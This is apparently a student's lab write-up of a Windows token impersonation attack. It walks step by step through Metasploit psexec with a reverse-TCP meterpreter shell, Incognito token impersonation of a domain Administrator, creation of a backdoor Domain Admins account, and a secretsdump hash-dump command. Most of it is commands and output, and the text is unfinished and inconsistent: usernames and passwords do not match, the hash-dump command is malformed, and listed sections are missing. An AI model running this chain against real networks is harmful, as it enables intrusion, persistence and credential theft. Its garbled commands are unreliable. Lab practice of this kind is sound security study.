# token impersonation attack

**Date:** May 2026  
**Author:** ShahinSecLab  
**Category:** Network Attack / Credential Capture  
**Difficulty:** Easy  
**Tools:** Meterpreter, Incognito, Windows Access Tokens

## Table of Contents

- [Introduction](#introduction)
- [Lab Setup](#lab-setup)
- [Attack Flow](#attack-flow)
- [Step 1 - Get a Meterpreter Session](#step-1---get-a-meterpreter-session)
- [Step 2 - Check UID](#step-2---check-uid)
- [Step 3 - Load Incognito](#step-3---load-incognito)
- [Step 4 - List Available Tokens](#step-4---list-available-tokens)
- [Step 5 - Impersonate the Administrator Token](#step-5---impersonate-the-administrator-token)
- [Step 6 - Verify Access](#step-6---verify-access)
- [Why It Worked](#why-it-worked)
- [Detection](#detection)
- [Mitigation](#mitigation)
- [Key Takeaways](#key-takeaways)
- [References](#references)
- [Disclaimer](#disclaimer)

## Introduction

In this lab, I practiced a Windows Token Impersonation attack.

Windows creates an access token whenever a user logs in. The token contains information about that user's permissions and privileges.

If a privileged token is available on a compromised machine, it may be possible to impersonate that token and perform actions as that user.

The goal of this lab was to identify available tokens and impersonate a privileged account from an existing Meterpreter session.

## lab Setup

```
| Machine             | Role              |   Ip          |
| ------------------- | ----------------- |---------------|
| Kali Linux          | Attacker          | 192.168.5.128 |
| Windows 10          | Victim            | 192.168.5.142 |
| Windows Server 2019 | Domain Controller | 192.168.5.134 |

I already have..
Domain: readteambd.local
User: rahimkhan
Pass: Password1
```

## Attack Flow

```
Gain Initial Access
        │
        ▼
List Available Tokens
        │
        ▼
Find Administrator Token
        │
        ▼
Impersonate Token
        │
        ▼
Gain Elevated Privileges
```

## Step 1 - Get a Meterpreter Session

### Starting Metasploit

### Step 1.1: Run the following command to start the Metasploit console:

```bash
msfconsole -q
```

**What it does:**

* `msfconsole` starts the Metasploit Framework console.
* The `-q` flag starts Metasploit in quiet mode.
* This hides the startup banner and extra messages, giving a cleaner terminal output.

**Output:**

```text
msf6 >
```
<p align="center">
  <img src="/writeups/token impersonation attack/images/step1 1.1.png" width="600">
</p>

The quiet mode does not change how Metasploit works. It only reduces the amount of information displayed when the console starts.


### Step 1.2: Now search for `psexec`

```bash
search psexec
```

It searches the Metasploit database for all available modules related to psexec.

**Output:**

```
Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   0   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal     No     DCOM Exec
   1   exploit/windows/smb/smb_relay                2001-03-31       excellent  Yes    MS08-068 Microsoft Windows SMB Relay Code Execution
   2     \_ action: CREATE_SMB_SESSION              .                .          .      Do not close the SMB connection after relaying, and instead create an SMB session
   3     \_ action: PSEXEC                          .                .          .      Use the SMB Connection to run the exploit/windows/psexec module against the relay target
   4     \_ target: Automatic                       .                .          .      .
   5     \_ target: PowerShell                      .                .          .      .
   6     \_ target: Native upload                   .                .          .      .
   7     \_ target: MOF upload                      .                .          .      .
   8     \_ target: Command                         .                .          .      .
   9   exploit/windows/smb/ms17_010_psexec          2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   10    \_ target: Automatic                       .                .          .      .
   11    \_ target: PowerShell                      .                .          .      .
   12    \_ target: Native upload                   .                .          .      .
   13    \_ target: MOF upload                      .                .          .      .
   14    \_ AKA: ETERNALSYNERGY                     .                .          .      .
   15    \_ AKA: ETERNALROMANCE                     .                .          .      .
   16    \_ AKA: ETERNALCHAMPION                    .                .          .      .
   17    \_ AKA: ETERNALBLUE                        .                .          .      .
   18  auxiliary/admin/smb/ms17_010_command         2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   19    \_ AKA: ETERNALSYNERGY                     .                .          .      .
   20    \_ AKA: ETERNALROMANCE                     .                .          .      .
   21    \_ AKA: ETERNALCHAMPION                    .                .          .      .
   22    \_ AKA: ETERNALBLUE                        .                .          .      .
   23  auxiliary/scanner/smb/psexec_loggedin_users  .                normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
   24  exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
   25    \_ target: Automatic                       .                .          .      .
   26    \_ target: PowerShell                      .                .          .      .
   27    \_ target: Native upload                   .                .          .      .
   28    \_ target: MOF upload                      .                .          .      .
   29    \_ target: Command                         .                .          .      .
   30  auxiliary/admin/smb/psexec_ntdsgrab          .                normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
   31  exploit/windows/local/current_user_psexec    1999-01-01       excellent  No     PsExec via Current User Token
   32  encoder/x86/service                          .                manual     No     Register Service
   33  auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal     No     WMI Exec
   34  exploit/windows/smb/webexec                  2018-10-24       manual     No     WebExec Authenticated User Code Execution
   35    \_ target: Automatic                       .                .          .      .
   36    \_ target: Native upload                   .                .          .      .
   37  exploit/windows/local/wmi                    1999-01-01       excellent  No     Windows Management Instrumentation (WMI) Remote Command Execution
   ```

<p align="center">
  <img src="/writeups/token impersonation attack/images/step1 1.2.png" width="600">
</p>


### Step 1.3: use `exploit/windows/smb/psexec`

This Metasploit module is used to run commands on a remote Windows machine through SMB (port 445) using valid credentials or NTLM hashes.

```bash
use exploit/windows/smb/psexec
```

**Output:**

```text
msf > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp                                                                                      
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST                                                                                                       
msf exploit(windows/smb/psexec) >    
```

<p align="center">
  <img src="/writeups/token impersonation attack/images/step1 1.3.png" width="600">
</p>

**Why it is used:**

* To run commands on a remote Windows system
* When you already have a valid username and password or NTLM hash (Pass-the-Hash)
* To get a Meterpreter session on the target machine
* To move from one system to another inside a network

**How it works:**

The module creates a service on the target Windows system through SMB and runs a payload. This gives access to the system using the rights of the logged-in user.

**Use case:**

* After getting access to a system
* Moving to other machines in the same network
* Working in a lab or testing environment

### Step 1.4: Display all available settings for a Metasploit module.

```bash
msf exploit(windows/smb/psexec) > options
```

The `options` command is used to display all available settings for a Metasploit module.

**What it shows:**

It lists all required and optional parameters for the selected module.

**Example settings you may see:**

* **RHOSTS** → Target IP address
* **RPORT** → Target port (default: 445 for SMB)
* **SMBUSER** → Username for authentication
* **SMBPASS** → Password or NTLM hash
* **PAYLOAD** → Payload type to be used
* **LHOST** → Attacker IP address
* **LPORT** → Listening port on attacker machine

**Why it is used:**

* To check what values need to be set before running an exploit
* To verify if all required fields are filled
* To avoid errors during execution


**Output:**

```
msf exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):
   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share

   Used when connecting via an existing SESSION:
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on

   Used when making a new connection via RHOSTS:
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      445              no        The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.5.128    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:
   Id  Name
   --  ----
   0   Automatic
View the full module info with the info, or info -d command.
```
<p align="center">
  <img src="/writeups/token impersonation attack/images/step1 1.4.png" width="600">
</p>

### Step 1.5: Setting Required Options

Before running the exploit, need to configure the target and login details.

```bash
set RHOSTS 192.168.5.142
set SMBUSER rahimkhan
set SMBPASS Password1
set SMBDomain readteambd.local
```

**What these mean:**

* **RHOSTS** → Target machine IP address
* **SMBUSER** → Username used to log in
* **SMBPASS** → Password or NTLM hash for authentication
* **SMBDomain** → Domain name of the target environment

**Purpose:**

These values tell Metasploit:

* which machine to attack
* which credentials to use
* how to authenticate to the target system

**Output:**

```text
msf exploit(windows/smb/psexec) > set RHOSTS 192.168.5.142
RHOSTS => 192.168.5.142
msf exploit(windows/smb/psexec) > set Interrupt: use the 'exit' command to quit
msf exploit(windows/smb/psexec) > set RHOSTS 192.168.5.142
RHOSTS => 192.168.5.142
msf exploit(windows/smb/psexec) > set SMBUser rahimkhan
SMBUser => rahimkhan
msf exploit(windows/smb/psexec) > set SMBPass Password1
SMBPass => Password1
msf exploit(windows/smb/psexec) > set SMBDomain readteambd.local
SMBDomain => readteambd.local
msf exploit(windows/smb/psexec) >
```
<p align="center">
  <img src="/writeups/token impersonation attack/images/step1 1.5.png" width="600">
</p>

### Step 1.6: Get Meterpreter Session

Now just run the following command & get meterpreter session

```bash
run
```

**Output:**

```text
msf exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 192.168.5.128:4444 
[*] 192.168.5.142:445 - Connecting to the server...
[*] 192.168.5.142:445 - Authenticating to 192.168.5.142:445|readteambd.local as user 'rahimkhan'...
[*] 192.168.5.142:445 - Selecting PowerShell target
[*] 192.168.5.142:445 - Executing the payload...
[+] 192.168.5.142:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (196678 bytes) to 192.168.5.142
[*] Meterpreter session 1 opened (192.168.5.128:4444 -> 192.168.5.142:59364) at 2026-06-01 02:42:04 -0400

meterpreter >
```

<p align="center">
  <img src="/writeups/token impersonation attack/images/step1 1.6.png" width="600">
</p>


## Step 2: Check uid

After getting a Meterpreter session on the Windows machine, I checked which user I was running as.

```bash
getuid
```

**Output:**

```text
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

<p align="center">
  <img src="/writeups/token impersonation attack/images/step2-1.png" width="600">
</p>

## Step 2 - Load Incognito

The Incognito extension allows token enumeration and impersonation.

```bash
load incognito
```

**Output:**

```text
meterpreter > load incognito
Loading extension incognito...Success.
```

## Step 3 - List Available Tokens

```bash
meterpreter > list_tokens -u
```

**Output:**

```text
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
READTEAMBD\Administrator
Window Manager\DWM-1

Impersonation Tokens Available
========================================
No tokens available
```

<p align="center">
  <img src="/writeups/token impersonation attack/images/step3.png" width="600">
</p>

## Step 4 - Impersonate the Administrator Token

```bash
impersonate_token "READTEAMBD\\Administrator"
```

**Output:**

```text
meterpreter > impersonate_token READTEAMBD\\Administrator
[+] Delegation token available
[+] Successfully impersonated user READTEAMBD\Administrator
```

## Step 5 - Verify Access

```bash
getuid
```

**Output:**

```text
meterpreter > getuid
Server username: READTEAMBD\administrator
```

The session was now running with Administrator privileges.

## Step 6 - Add new user

```bash
shell
```

**Output:**

```text
meterpreter > shell
Process 2236 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.2965]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

### Create a Domain User

The following command creates a new domain user named `testuser` with the password `@testuser#!`:

```bash
net user test @shahin123#! /add /domain
```

```text
Command Breakdown
net user – Used to manage user accounts in Windows.
test – The username of the new account.
@shahin123#! – The password assigned to the account.
/add – Creates a new user account.
/domain – Performs the action on the Active Directory domain instead of the local machine.
```

**Output:**

## Add a User to the Domain Admins Group

The following command attempts to add the user `test` to the `Domain Admins` group:

```bash
net group "Domain Admins" test /ADD /DOMAIN
```
 Dump all hashes:

 secretdump.py readteambd.local/testuser:@terstuser#!





# Key Takeaways

- Windows creates an access token when a user logs in.
- Access tokens contain the user's permissions.
- A privileged token can sometimes be reused without knowing the user's password.
- Token impersonation is a common post-exploitation technique.
- Monitoring privileged activity can help detect this behavior.

# Mitigation

- Follow the principle of least privilege
- Limit use of privileged accounts
- Review accounts with SeImpersonatePrivilege
- Enable Credential Guard
- Monitor suspicious process activity